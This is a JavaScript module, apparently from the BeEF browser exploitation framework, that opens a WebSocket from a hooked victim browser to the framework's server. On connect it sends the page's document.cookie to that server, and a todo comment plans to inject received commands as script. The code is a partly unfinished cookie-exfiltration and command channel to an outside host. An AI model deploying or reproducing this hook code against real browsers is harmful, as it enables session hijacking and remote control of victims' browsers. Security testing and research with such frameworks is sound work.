//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//

//beef.websocket.socket.send(take answer to server beef)
/*New browser init call this */

beef.websocket = {

    socket:null,

    init:function () {
        var webSocketServer = beef.net.host;
        var webSocketPort = 11989;
        //@todo ceck if we have to use wss or ws we need a globalvalue
        if (beef.browser.isFF() && ! beef.browser.isFF11) {
            beef.websocket.socket = new MozWebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");

        } else{
            beef.websocket.socket = new WebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");

        }

    },
    /*websocket send Helo to beef server and start async communication*/
    start:function () {
        new beef.websocket.init();
        /*so the server is just up we need send helo id @todo insert browser ID where can i get them?*/
        this.socket.onopen = function () {
            console.log("Socket has been opened!");

            /*send browser id*/
            beef.websocket.send(document.cookie);
            console.log("Connected and Helo");
        }
        this.socket.onmessage = function (message){
           //@todo append the command to head in <script> </script>
            console.log("We recive a message "+message.data);

        }

    },

    send:function (data) {
        this.socket.send(data);
        console.log("Sent [" + data + "]");
    }

};

beef.regCmp('beef.websocket');